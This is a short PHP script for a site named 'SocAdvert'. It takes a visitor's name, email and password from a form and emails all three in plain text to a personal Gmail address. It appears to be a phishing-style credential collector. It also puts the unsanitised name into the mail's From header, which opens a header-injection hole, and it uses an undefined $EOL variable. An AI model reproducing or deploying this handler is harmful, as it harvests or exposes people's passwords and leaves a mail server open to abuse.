<?php

$recepient = "pashakiz@gmail.com";
$sitename = "SocAdvert";

$name = trim($_POST["name"]);
$email = trim($_POST["email"]);
$pass = trim($_POST["pass"]);

$pagetitle = "Новая заявка с сайта \"$sitename\"";
$message = "Имя: $name \r\nEmail: $email \r\nПароль: $pass";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"$EOL From: $name <$recepient>");